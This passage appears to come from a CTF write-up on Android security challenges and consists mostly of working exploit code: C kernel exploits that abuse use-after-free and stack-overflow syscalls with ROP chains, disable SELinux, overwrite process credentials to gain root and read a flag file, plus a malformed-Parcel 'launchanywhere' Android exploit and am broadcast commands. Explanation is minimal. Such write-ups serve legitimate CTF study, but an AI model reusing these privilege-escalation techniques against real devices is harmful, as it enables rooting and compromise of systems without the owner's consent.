    while(result == 0 && i++ < 128)    {        task = read_word(task + TASK_OFFSET + 8) - TASK_OFFSET;        printf("task: %#llxn", task);        if(task == init_task)        {            break;        }        name = read_word(task + NAME_OFFSET);        printf("name: %sn", (char *)&name);        if((name & 0xffffff) == 0x00707865) // "exp"        {            result = task;        }    }
    return result;}
int exploit(){    char buf[0x100];    size_t current_task = 0;    size_t cred = 0;    int fd;    size_t slab1, slab2, kernel_base_addr, key;
    syscall(__NR_uaf, NULL, 0, (0 << 8)|0);    syscall(__NR_uaf, NULL, 0, (1 << 8)|0);    syscall(__NR_uaf, NULL, 0, (2 << 8)|0);    syscall(__NR_uaf, NULL, 0, (3 << 8)|0);    syscall(__NR_uaf, NULL, 0, (0 << 8)|1);    syscall(__NR_uaf, NULL, 0, (1 << 8)|1);    syscall(__NR_uaf, NULL, 0, (2 << 8)|1);    syscall(__NR_uaf, NULL, 0, (3 << 8)|1);
    syscall(__NR_uaf, NULL, 0, (4 << 8)|0);    if((fd = open("/dev/ptmx", O_RDONLY)) == -1)    {        perror("open");        exit(EXIT_FAILURE);    }    syscall(__NR_uaf, NULL, 0, (5 << 8)|0);
    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 8, (1 << 8)|2);    slab1 = *(size_t*)(buf+0) - 0x60;    printf("slab1: %#llxn", slab1);
    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 0x28, (2 << 8)|2);    slab2 = *(size_t*)(buf+0) - 0x60;    printf("slab2: %#llxn", slab2);        kernel_base_addr = *(size_t*)(buf+0x20) - 0xdac3b8;    printf("kernel_base_addr: %#llxn", kernel_base_addr);
    close(fd);
    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 8, (1 << 8)|2);    key = *(size_t*)(buf+0) ^ slab2;    printf("key: %#llxn", key);
    memset(buf, 0, sizeof(buf));    *(size_t*)(buf+0) = key ^ 0xffffffc011a4dfb8;    syscall(__NR_uaf, buf, 8, (1 << 8)|3);
    syscall(__NR_uaf, NULL, 0, (6 << 8)|0);    syscall(__NR_uaf, NULL, 0, (7 << 8)|0);
    syscall(__NR_uaf, NULL, 0, (1 << 8)|1);    memset(buf, 0, sizeof(buf));    *(size_t*)(buf+0) = key ^ 0;    syscall(__NR_uaf, buf, 8, (1 << 8)|3);
    write_word(0xFFFFFFC011A7A8A8, 0);
    current_task = get_current_task();    printf("current_task: %#lxn", current_task);    cred = read_word(current_task + 0x738);    printf("cred: %#lxn", cred);        *(size_t*)(buf+0) = cred + 4;    syscall(__NR_uaf, buf, 8, (7 << 8)|3);    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 0x20, (8 << 8)|3);
    printf("uid: %dn", getuid());
    return 0;}
int readflag(){    int fd = 0;    char buf[0x100];    int result;
    fd = open("/system/flag", O_RDONLY);    if(fd == -1)    {        perror("open");        exit(EXIT_FAILURE);    }    memset(buf, 0, sizeof(buf));    result = read(fd, buf, sizeof(buf)-1);    printf("result: %dn", result);    write(STDOUT_FILENO, buf, result);
    close(fd);
    return 0;}

int main(){    setbuf(stdout, NULL);
    puts("Start");
    exploit();
    readflag();
    puts("End");
    return 0;}

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群1:222328705

星盟安全团队纳新群2:346014666

有兴趣的师傅欢迎一起来讨论!


```
package com.test.chall_exploit;
import android.content.Intent;import android.os.Bundle;import android.os.Parcel;
public class comm implements IGenerateMalformedParcel{
    @Override    public Parcel generate(Intent intent) {
        Bundle bundle = new Bundle();        Parcel obtain = Parcel.obtain();        Parcel obtain2 = Parcel.obtain();        Parcel obtain3 = Parcel.obtain();        obtain.writeInt(-1);        obtain.writeInt(0x4c444E42); 
        obtain2.writeInt(3);        obtain2.writeString("launchanywhere");        obtain2.writeInt(4);        obtain2.writeString("android.os.VulnParcelable");        obtain2.writeInt(1);        obtain2.writeInt(0);        obtain2.writeInt(0); 
        obtain2.writeInt(13);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(13);        obtain2.writeInt(56);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(1);        obtain2.writeInt(1);        obtain2.writeInt(13);        obtain2.writeInt(22);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(0);        obtain2.writeInt(13);        obtain2.writeInt(-1);
        int dataPosition = obtain2.dataPosition();        obtain2.writeString("intent");        obtain2.writeInt(4);        obtain2.writeString("android.content.Intent");        intent.writeToParcel(obtain3, 0);        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();        obtain2.setDataPosition(dataPosition - 4);        obtain2.writeInt(dataPosition2 - dataPosition);        obtain2.setDataPosition(dataPosition2);
        int dataSize = obtain2.dataSize();        obtain.setDataPosition(0);        obtain.writeInt(dataSize);        obtain.appendFrom(obtain2, 0, dataSize);        obtain.setDataPosition(0);
        return obtain;    }}
```



```
<receiver    android:name="com.avss.testreceiver.MyBroadcastReceiver">    <intent-filter>        <action android:name="com.avss.testreceiver.GET_FLAG" />    </intent-filter></receiver>
```



```
am broadcast -a com.avss.testreceiver.GET_FLAG com.avss.testreceiverlogcat
```



```
am broadcast -a com.avss.testreceiver.GET_FLAG --es sms_body '1' -n com.avss.testreceiver/.IntentReceiverlogcat -d | grep flag
```



```
+noinline long stackof_read(char __user * addr, unsigned long len) {+    char buffer[0x100];+    long ans;+    memset(buffer, 0, sizeof(buffer));+    ans=my_ctu(buffer,addr,len);+    return ans;+}++noinline long sys_stackof_handler(char __user * addr, unsigned long len, int option) {    +    if(option){+      return stackof_read(addr,len);+    }+    else{+      return stackof_write(addr,len);+    }+}
```



```
#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>#include <signal.h>#include <errno.h>#include <sys/mman.h>
#define __NR_stackof 601
char *flag = NULL;
void get_root(int sig){    uid_t uid = 0;    int fd = 0;        fd = open("/system/flag", O_RDONLY);    if(fd == -1) *(char *)0 = 0;        if(read(fd, flag, 0x100) == -1) *(char *)0 = 0;
    puts("END");    while(1)    exit(EXIT_SUCCESS);}
int exp1(){    char buf[0x1000];    int i = 0x100;    printf("start exp1n");    memset(buf, 0, sizeof(buf));    *(size_t *)(buf + i) = 0x61; i += 8;    *(size_t *)(buf + i) = 0xFFFFFFC0000C1354; i += 8; // prepare_kernel_cred    *(size_t *)(buf + i) = 0x63; i += 8;    *(size_t *)(buf + i) = 0xFFFFFFC0000C0E1C; i += 8; // commit_creds    *(size_t *)(buf + i) = 0x65; i += 0x18;    *(size_t *)(buf + i) = 0xffffffc000084270; i += 8; // ret_to_user    *(size_t *)(buf + i) = 0x67; i += 0x118;
    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)get_root; i += 8;    *(size_t *)(buf + i) = (size_t)0x80000000; i += 8;    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)0x259; i += 8;    syscall(__NR_stackof, buf, i ^ 0xdeadbeefdeadbeef, 0);}
int leak(){    char buf[0x1000];    size_t ret_addr = 0;    memset(buf, 0, sizeof(buf));    printf("start leakn");    syscall(__NR_stackof, buf, 0x900 ^ 0xdeadbeefdeadbeef, 1);    ret_addr = *(size_t*)(buf+0x118);    printf("ret_addr: %#lxn", ret_addr);}
int main(){        setbuf(stdout, NULL);
    signal(SIGSEGV, get_root);
    printf("uid: %dn", getuid());
    flag = mmap((void *)0xabcd00000, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);    if(flag == MAP_FAILED)    {        perror("mmap");        exit(EXIT_FAILURE);    }    memset(flag, 0, 0x1000);
    if(fork() == 0)    {        exp1();        get_root(0);        while(1)        exit(EXIT_FAILURE);    }
    sleep(1);    puts(flag);
    return 0;}
```



```
#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>#include <signal.h>#include <errno.h>#include <sys/mman.h>
#define __NR_stackof 601
char *flag = NULL;
void get_root(int sig){    uid_t uid = 0;    int fd = 0;        fd = open("/system/flag", O_RDONLY);    if(fd == -1) *(char *)0 = 0;        if(read(fd, flag, 0x100) == -1) *(char *)0 = 0;
    puts("END");    while(1)    exit(EXIT_SUCCESS);}
int exp1(){    char buf[0x1000];    int i = 0x100;    printf("start exp1n");    printf("get_root %lxn", (size_t)get_root);    memset(buf, 0, sizeof(buf));    *(size_t *)(buf + i) = 0x61; i += 8;    *(size_t *)(buf + i) = 0xFFFFFFC0000BCCF0; i += 8; // prepare_kernel_cred    *(size_t *)(buf + i) = 0x63; i += 8;    *(size_t *)(buf + i) = 0xFFFFFFC0000BC920; i += 8; // commit_creds    *(size_t *)(buf + i) = 0x65; i += 0x18;    *(size_t *)(buf + i) = 0xffffffc0000864a4; i += 8; // ret_to_user    *(size_t *)(buf + i) = 0x67; i += 0x128;
    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)get_root; i += 8;    *(size_t *)(buf + i) = (size_t)0x80000000; i += 8;    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)0x259; i += 8;    syscall(__NR_stackof, buf, i ^ 0xdeadbeefdeadbeef, 0);}
int leak(){    char buf[0x1000];    size_t ret_addr = 0;    memset(buf, 0, sizeof(buf));    printf("start leakn");    syscall(__NR_stackof, buf, 0x900 ^ 0xdeadbeefdeadbeef, 1);    ret_addr = *(size_t*)(buf+0x118);    printf("ret_addr: %#lxn", ret_addr);}
int main(){        setbuf(stdout, NULL);
    signal(SIGSEGV, get_root);
    printf("uid: %dn", getuid());
    flag = mmap((void *)0xabcd00000, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);    if(flag == MAP_FAILED)    {        perror("mmap");        exit(EXIT_FAILURE);    }    memset(flag, 0, 0x1000);
    if(fork() == 0)    {        exp1();        get_root(0);        while(1)        exit(EXIT_FAILURE);    }
    sleep(1);    puts(flag);
    return 0;}
```



```
#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>#include <signal.h>#include <errno.h>#include <sys/mman.h>
#define __NR_stackof 601
char *flag = NULL;
void get_root(int sig){    uid_t uid = 0;    int fd = 0;        fd = open("/system/flag", O_RDONLY);    if(fd == -1) *(char *)0 = 0;        if(read(fd, flag, 0x100) == -1) *(char *)0 = 0;
    puts("END");    while(1)    exit(EXIT_SUCCESS);}
int exp1(){    char buf[0x1000];    int i = 0x100;    printf("start exp1n");    printf("get_root %lxn", (size_t)get_root);    memset(buf, 0, sizeof(buf));    *(size_t *)(buf + i) = 0x61; i += 8;    *(size_t *)(buf + i) = 0xFFFFFFC0000BC900; i += 8; // prepare_kernel_cred    *(size_t *)(buf + i) = 0x63; i += 8;    *(size_t *)(buf + i) = 0xFFFFFFC0000BC530; i += 8; // commit_creds    *(size_t *)(buf + i) = 0x65; i += 0x18;    *(size_t *)(buf + i) = 0xffffffc0000864a4; i += 8; // ret_to_user    *(size_t *)(buf + i) = 0x67; i += 0x128;
    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)get_root; i += 8;    *(size_t *)(buf + i) = (size_t)0x80000000; i += 8;    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)0x259; i += 8;    syscall(__NR_stackof, buf, i ^ 0xdeadbeefdeadbeef, 0);}
int leak(){    char buf[0x1000];    size_t ret_addr = 0;    memset(buf, 0, sizeof(buf));    printf("start leakn");    syscall(__NR_stackof, buf, 0x900 ^ 0xdeadbeefdeadbeef, 1);    ret_addr = *(size_t*)(buf+0x118);    printf("ret_addr: %#lxn", ret_addr);}
int main(){        setbuf(stdout, NULL);
    signal(SIGSEGV, get_root);
    printf("uid: %dn", getuid());
    flag = mmap((void *)0xabcd00000, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);    if(flag == MAP_FAILED)    {        perror("mmap");        exit(EXIT_FAILURE);    }    memset(flag, 0, 0x1000);
    if(fork() == 0)    {        exp1();        get_root(0);        while(1)        exit(EXIT_FAILURE);    }
    sleep(1);    puts(flag);
    return 0;}
```



```
__int64 __fastcall stackof_write(__int64 a1, __int64 a2){  __int64 result; // x0  __int64 v3; // x0  __int64 v4[32]; // [xsp+8h] [xbp-118h] BYREF  __int64 v5; // [xsp+108h] [xbp-18h]
  v5 = canary;  memset(v4, 0, sizeof(v4));  result = my_cfu(v4, a1, a2);  if ( canary != v5 )  {    v3 = sub_FFFFFF80080AE1A0(result);    return sub_FFFFFF80080DB1F0(v3);  }  return result;}
```



```
#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>#include <signal.h>#include <errno.h>#include <sys/mman.h>
#define __NR_stackof 601
char *flag = NULL;size_t canary = 0;
void get_root(int sig){    uid_t uid = 0;    int fd = 0;        fd = open("/system/flag", O_RDONLY);    if(fd == -1) *(char *)0 = 0;        if(read(fd, flag, 0x100) == -1) *(char *)0 = 0;
    puts("END");    while(1)    exit(EXIT_SUCCESS);}
int exp1(){    char buf[0x1000];    int i = 0x100;    printf("start exp1n");    printf("get_root %lxn", (size_t)get_root);    memset(buf, 0, sizeof(buf));    *(size_t *)(buf + i) = canary; i += 8;    *(size_t *)(buf + i) = 0x61; i += 0x18;    *(size_t *)(buf + i) = 0xffffff8008080000 + 0x000000000039cc30; i += 0x18; // ldr x0, [sp, #0x10]; ldp x29, x30, [sp, #0x50]; add sp, sp, #0x60; ret;    *(size_t *)(buf + i) = 0xFFFFFF8008E99F08 - 0x90; i += 0x48;
    *(size_t *)(buf + i) = 0xffffff8008080000 + 0x000000000004c424; i += 0x10; // ldr x0, [x0, #0x90]; ldp x29, x30, [sp], #0x10; ret;    *(size_t *)(buf + i) = 0xffffff8008080000 + 0x0000000000049268; i += 0x60; // ldp x29, x30, [sp, #0x50]; ldp x20, x19, [sp, #0x40]; ldp x22, x21, [sp, #0x30]; add sp, sp, #0x60; ret;    *(size_t *)(buf + i) = 0xFFFFFF80080D8A40; i += 0x28; // prepare_kernel_cred    *(size_t *)(buf + i) = 0x63; i += 8;    *(size_t *)(buf + i) = 0xFFFFFF80080D8670; i += 8; // commit_creds    *(size_t *)(buf + i) = 0x65; i += 0x28;    *(size_t *)(buf + i) = 0xffffff8008083c2c; i += 8; // ret_to_user    *(size_t *)(buf + i) = 0x67; i += 0xf8;
    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)get_root; i += 8;    *(size_t *)(buf + i) = (size_t)0x80000000; i += 8;    *(size_t *)(buf + i) = (size_t)buf; i += 8;    *(size_t *)(buf + i) = (size_t)0x259; i += 8;    syscall(__NR_stackof, buf, i ^ 0xdeadbeefdeadbeef, 0);}
int leak(){    char buf[0x1000];    size_t ret_addr = 0;    memset(buf, 0, sizeof(buf));    printf("start leakn");    syscall(__NR_stackof, buf, 0x108 ^ 0xdeadbeefdeadbeef, 1);    ret_addr = *(size_t*)(buf+0x100);    printf("ret_addr: %#lxn", ret_addr);    canary = ret_addr;}
int main(){        setbuf(stdout, NULL);
    signal(SIGSEGV, get_root);
    printf("uid: %dn", getuid());
    flag = mmap((void *)0xabcd00000, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);    if(flag == MAP_FAILED)    {        perror("mmap");        exit(EXIT_FAILURE);    }    memset(flag, 0, 0x1000);
    if(fork() == 0)    {        leak();        exp1();        get_root(0);        while(1)        exit(EXIT_FAILURE);    }
    sleep(1);    puts(flag);
    return 0;}
```



```
+noinline void show_buffer(char __user * addr, unsigned long len, unsigned int idx) {+    if (gst1[idx]) {+        my_ctu(gst1[idx]->name, addr, len);+    }+}++noinline void edit_buffer(char __user * addr, unsigned long len, unsigned int idx) {+    if (gst1[idx]) {+        my_cfu(gst1[idx]->name, addr, len);+    }+}
```



```
#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>
#define __NR_easyof 602
int main(){    setbuf(stdout, NULL);
    syscall(__NR_easyof, NULL, 0, 0x0101);    syscall(__NR_easyof, NULL, 0, 0x0201);    syscall(__NR_easyof, NULL, 0, 0x0100);    syscall(__NR_easyof, NULL, 0, 0x0200);
    // dmesg | grep p1
    return 0;}
```



```
#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>
#define __NR_easyof 602
int main(){    size_t p1, p2;    size_t min_p, max_p, min_index, max_index, offset;    char *ptr;    char buf[0x100];    uid_t uid;    int fd;
    setbuf(stdout, NULL);    printf("p1: ");    scanf("%lx", &p1);
    printf("p2: ");    scanf("%lx", &p2);
    if(p1 > p2)    {        min_p = p2;        min_index = 2;        max_p = p1;        max_index = 1;    }    else    {        min_p = p1;        min_index = 1;        max_p = p2;        max_index = 2;    }
    printf("min_p: %#lxn", min_p);    printf("max_p: %#lxn", max_p);    offset = max_p - min_p;    printf("offset: %#lxn", offset);    ptr = calloc(1, offset + 8);
    syscall(__NR_easyof, ptr, offset, (min_index << 8)|2);    printf("func: %pn", *(char **)(ptr + offset - 8));    *(size_t*)(ptr + offset - 8) = 0xffffffc0000c308c; // onestep    syscall(__NR_easyof, ptr, offset, (min_index << 8)|3);    if(syscall(__NR_easyof, NULL, 0, (max_index << 8)|4) == -1)    {        perror("easyof");        exit(EXIT_FAILURE);    }
    uid = getuid();    printf("uid: %dn", uid);
    if(uid == 0)    {        fd = open("/system/flag", O_RDONLY);        if(fd == -1)        {            perror("open");            exit(EXIT_FAILURE);        }
        memset(buf, 0, sizeof(buf));        read(fd, buf, sizeof(buf)-1);        puts(buf);    }
    puts("END");
    return 0;}
```



```
+noinline void del_buffer(unsigned int idx) {+    if (gst1[idx]) {+        kfree(gst1[idx]);+        // gst1[idx] = NULL;+    }+}
```



```
#include <unistd.h>#include <signal.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include <stdint.h>#include <fcntl.h>#include <sys/prctl.h>#include <sys/syscall.h>#include <sys/ipc.h>#include <sys/msg.h>#include <sched.h>#include <sys/types.h>#include <sys/stat.h>#include <fcntl.h>#include <sched.h>#include <unistd.h>
// #include "include/utils.h"
#ifndef _UTILS_H#define _UTILS_H
#include <stdio.h>#include <stdio.h>#include <string.h>#include <errno.h>#include <stdint.h>#include <unistd.h>#include <time.h>#include <sys/syscall.h>

#define hexd(f_, ...) {printf(f_, ##__VA_ARGS__);}
#define ADDR 1#define ASCL 1
void hexdump_fish(void* buf, uint64_t size, void *addr) {    unsigned int col = 0, off = 0;    unsigned char* p = (unsigned char*)buf;    hexd("%08lx:n", (uint64_t)addr);    char chr[0x10];    while (size--) {   #ifdef ADDR        /********** address print *********/        if (!col)            hexd("%08lx:", off + (uint64_t)addr);#endif        chr[col] = *p;        hexd(" %02x", *p++);        off++;        col++;        if (!(col % 16)) {#ifdef ASCL            /********** ascll print *********/            hexd("  |  ");            for (int i=0; i<16; i++) {                if (chr[i] >= 0x20 && chr[i] < 0x7f) {                    hexd("%c", chr[i]);                }                else {                    hexd("`");                }            }#endif            hexd("n");            col = 0;        } else if (!(col % 4))            hexd("  ");    }    for (int i=0; i<off%16; i++)        hexd("%c", chr[i]);    hexd("n");    }
#endif
#define __NR_testtest 600#define __NR_uaf 602
typedef struct {    char name[256];    char str[128];} my_struct;
char buf[256] = {0};
int new_uaf(int idx) {        int option = (idx << 8) + 0;    return syscall(__NR_uaf, NULL, 0, option);}
int del_uaf(int idx) {        int option = (idx << 8) + 1;    return syscall(__NR_uaf, NULL, 0, option);}
int show_uaf(void *addr, uint64_t len, int idx) {
    int option = (idx << 8) + 2;
    return syscall(__NR_uaf, addr, len, option);}
int edit_uaf(void *addr, uint64_t len, int idx) {
    int option = (idx << 8) + 3;
    return syscall(__NR_uaf, addr, len, option);}
int get_current(uint64_t init_task, uint64_t offset, uint64_t cred) {      // get task_struct->tasks.prev    *(uint64_t*)buf = init_task + offset + 8;    edit_uaf(buf, 0x8, 12);    show_uaf(buf, 0x10, 0);    hexdump_fish(buf, 0x10, buf);        *(uint64_t*)buf = *(uint64_t*)buf - offset + cred;    edit_uaf(buf, 0x8, 12);    show_uaf(buf, 0x10, 0);    hexdump_fish(buf, 0x10, buf);
    edit_uaf(buf, 0x8, 12);    show_uaf(buf, 0x40, 0);    hexdump_fish(buf, 0x40, buf);        if (!*(uint32_t*)(buf+0x4))        return -1;
    memset(buf+0x4, 0x0, 0x30);    edit_uaf(buf, 0x30, 0);
    return 0;}

int main(int argc, char *argv[]) {    printf("fishn");
    printf("size: %#lxn", sizeof(my_struct));
    for (int i=0; i<10; i++)        new_uaf(i);    del_uaf(0);    del_uaf(1);    del_uaf(2);        *(uint64_t*)buf = 0xFFFFFFC0006E15E8;    edit_uaf(buf, 0x8, 2);
    new_uaf(11);    new_uaf(12);    // memset(buf, 0x0, 0x100);    // show_uaf(buf, 0x100, 12);    // hexdump_fish(buf, 0x100, buf);        // selinux_enforcing    *(uint64_t*)buf = 0xFFFFFFC0006EBACC;    edit_uaf(buf, 0x8, 12);    //show_uaf(buf, 0x10, 0);    //hexdump_fish(buf, 0x10, buf);    *(uint32_t*)buf = 0x0;    edit_uaf(buf, 0x4, 0);        // init_task    int ret = get_current(0xFFFFFFC00069B820, 0x170, 0x3a0);        if (!ret) {        int fd = open("/system/flag", O_RDONLY);        read(fd, buf, 0x40);        printf("%sn", buf);    }    return 0;}
```



```
#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>#include <signal.h>#include <errno.h>#include <sys/mman.h>
#define __NR_uaf 602
// #define DEBUG#ifndef DEBUG#define printf(...)#define fprintf(...)#define perror(...)#define puts(...)#define setbuf(...)#endif
size_t read_word(size_t addr){    size_t result = 0;    syscall(__NR_uaf, &addr, 8, (3 << 8)|3);    syscall(__NR_uaf, &result, 8, (0 << 8)|2);    return result;}
size_t write_word(size_t addr, size_t value){    syscall(__NR_uaf, &addr, 8, (3 << 8)|3);    syscall(__NR_uaf, &value, 8, (0 << 8)|3);    return 0;}
size_t get_current_task(){    int pid = getpid();    size_t init_task = 0xffffffc000934e80, task = init_task;    size_t result = 0;    int task_pid = 0;    int i = 0;
    #define PID_OFFSET 0x438    #define TASK_OFFSET 0x348
    while(result == 0 && i++ < 1024)    {        task = read_word(task + TASK_OFFSET) - TASK_OFFSET;        if(task == init_task)        {            break;        }        task_pid = read_word(task + PID_OFFSET);        if(task_pid == pid)        {            result = task;        }    }
    return result;}
int exploit(){    char buf[0x100];    size_t current_task = 0;    size_t cred = 0;
    syscall(__NR_uaf, NULL, 0, (0 << 8)|0);    syscall(__NR_uaf, NULL, 0, (1 << 8)|0);    syscall(__NR_uaf, NULL, 0, (0 << 8)|1);    *(size_t*)(buf+0) = 0xffffffc000988618;    syscall(__NR_uaf, buf, 8, (0 << 8)|3);    syscall(__NR_uaf, NULL, 0, (2 << 8)|0);    syscall(__NR_uaf, NULL, 0, (3 << 8)|0);
    syscall(__NR_uaf, NULL, 0, (0 << 8)|1);    *(size_t*)(buf+0) = 0;    syscall(__NR_uaf, buf, 8, (0 << 8)|3);
    *(size_t*)(buf+0) = 0xffffffc0009c33b4; // selinux_enforcing    syscall(__NR_uaf, buf, 8, (3 << 8)|3);    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 4, (0 << 8)|3);
    current_task = get_current_task();    printf("current_task: %#lxn", current_task);    cred = read_word(current_task + 0x5d0);    printf("cred: %#lxn", cred);
        *(size_t*)(buf+0) = cred + 4;    syscall(__NR_uaf, buf, 8, (3 << 8)|3);    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 0x20, (0 << 8)|3);
    printf("uid: %dn", getuid());
    return 0;}
int readflag(){    int fd = 0;    char buf[0x100];    int result;
    fd = open("/system/flag", O_RDONLY);    if(fd == -1)    {        perror("open");        exit(EXIT_FAILURE);    }    memset(buf, 0, sizeof(buf));    result = read(fd, buf, sizeof(buf)-1);    printf("result: %dn", result);    write(STDOUT_FILENO, buf, result);
    close(fd);
    return 0;}

int main(){    setbuf(stdout, NULL);
    puts("Start");
    exploit();
    readflag();
    puts("End");
    return 0;}
```



```
#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syscall.h>#include <unistd.h>#include <fcntl.h>#include <signal.h>#include <errno.h>#include <sys/mman.h>
#define __NR_uaf 602
#define DEBUG#ifndef DEBUG#define printf(...)#define fprintf(...)#define perror(...)#define puts(...)#define setbuf(...)#endif
size_t read_word(size_t addr){    size_t result = 0;    syscall(__NR_uaf, &addr, 8, (3 << 8)|3);    syscall(__NR_uaf, &result, 8, (0 << 8)|2);    return result;}
size_t write_word(size_t addr, size_t value){    syscall(__NR_uaf, &addr, 8, (3 << 8)|3);    syscall(__NR_uaf, &value, 8, (0 << 8)|3);    return 0;}
size_t get_current_task(){    size_t init_task = 0xffffff8008dbaf80, task = init_task;    size_t result = 0;    size_t name = 0;    int i = 0;
    #define NAME_OFFSET 0x750    #define TASK_OFFSET 0x4a8
    while(result == 0 && i++ < 1024)    {        task = read_word(task + TASK_OFFSET) - TASK_OFFSET;        printf("task: %#llxn", task);        if(task == init_task)        {            break;        }        name = read_word(task + NAME_OFFSET);        printf("name: %sn", (char *)&name);        if((name & 0xffffff) == 0x00707865) // "exp"        {            result = task;        }    }
    return result;}
int exploit(){    char buf[0x100];    size_t current_task = 0;    size_t cred = 0;
    syscall(__NR_uaf, NULL, 0, (0 << 8)|0);    syscall(__NR_uaf, NULL, 0, (1 << 8)|0);    syscall(__NR_uaf, NULL, 0, (0 << 8)|1);    *(size_t*)(buf+0) = 0xffffff8008e9bfb0;    syscall(__NR_uaf, buf, 8, (0 << 8)|3);    syscall(__NR_uaf, NULL, 0, (2 << 8)|0);    syscall(__NR_uaf, NULL, 0, (3 << 8)|0);
    syscall(__NR_uaf, NULL, 0, (0 << 8)|1);    *(size_t*)(buf+0) = 0;    syscall(__NR_uaf, buf, 8, (0 << 8)|3);
    *(size_t*)(buf+0) = 0xffffff8008eda7f0; // selinux_enforcing    syscall(__NR_uaf, buf, 8, (3 << 8)|3);    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 4, (0 << 8)|3);
    current_task = get_current_task();    printf("current_task: %#lxn", current_task);    cred = read_word(current_task + 0x740);    printf("cred: %#lxn", cred);
        *(size_t*)(buf+0) = cred + 4;    syscall(__NR_uaf, buf, 8, (3 << 8)|3);    memset(buf, 0, sizeof(buf));    syscall(__NR_uaf, buf, 0x20, (0 << 8)|3);
    printf("uid: %dn", getuid());
    return 0;}
int readflag(){    int fd = 0;    char buf[0x100];    int result;
    fd = open("/system/flag", O_RDONLY);    if(fd == -1)    {        perror("open");        exit(EXIT_FAILURE);    }    memset(buf, 0, sizeof(buf));    result = read(fd, buf, sizeof(buf)-1);    printf("result: %dn", result);    write(STDOUT_FILENO, buf, result);
    close(fd);
    return 0;}

int main(){    setbuf(stdout, NULL);
    puts("Start");
    exploit();
    readflag();
    puts("End");
    return 0;}
```



```
unsigned __int64 __fastcall sub_FFFFFFC01042451C(unsigned __int64 result, unsigned __int64 a2, char a3){  unsigned __int64 v3; // x30  char *v4; // x18  unsigned __int64 v7; // x20  __int64 (__fastcall *v8)(); // x11  unsigned __int64 v9; // x8  __int64 v10; // x9  __int64 v11; // x8  __int64 v12; // x2  __int64 v13; // x8  _QWORD *v14; // x8  unsigned __int64 v15; // x0  __int64 v16; // x1
  __writex18qword(8u, v3);  v4 = (char *)KeGetPcr() + 8;  __setReg(18, v4);  if ( !a2 )    goto LABEL_5;  v7 = result;  if ( a2 - 1 > ~result )    goto LABEL_21;  if ( result <= 0x10 )  {LABEL_22:    sub_FFFFFFC010424488("null address", 0i64, a3 & 1, v7, a2);    goto LABEL_23;  }  result = sub_FFFFFFC0104246FC(result, a2);  if ( (unsigned int)(result - 1) < 2 )  {LABEL_5:    __setReg(18, v4 - 8);    __setReg(18, (char *)KeGetPcr() - 8);    return result;  }  if ( (_DWORD)result )  {    sub_FFFFFFC010424488("process stack", 0i64, a3 & 1, 0i64, a2);LABEL_21:    sub_FFFFFFC010424488("wrapped address", 0i64, a3 & 1, 0i64, v7 + a2);    goto LABEL_22;  }  result = sub_FFFFFFC010216910(v7 >> 12);  if ( (_DWORD)result )  {    v9 = ((v7 + 0x8000000000i64) >> 6) & 0x3FFFFFFFFFFFFC0i64;    v10 = *(_QWORD *)(v9 - 0x1001FFFF8i64);    v11 = v9 - 0x100200000i64;    if ( (v10 & 1) != 0 )      v12 = v10 - 1;    else      v12 = v11;    v13 = *(_QWORD *)(v12 + 8);    if ( (v13 & 1) != 0 )      v14 = (_QWORD *)(v13 - 1);    else      v14 = (_QWORD *)v12;    if ( (*v14 & 0x200) != 0 )      result = sub_FFFFFFC010406170(v7, a2, v12, a3 & 1);  }  v8 = sub_FFFFFFC010081000;  if ( v7 >= (unsigned __int64)&unk_FFFFFFC010E40000 || v7 + a2 <= (unsigned __int64)sub_FFFFFFC010081000 )    goto LABEL_5;LABEL_23:  v15 = sub_FFFFFFC010424488("kernel text", 0i64, a3 & 1, v7 - (_QWORD)v8, a2);  return sub_FFFFFFC0104246FC(v15, v16);}
```



```
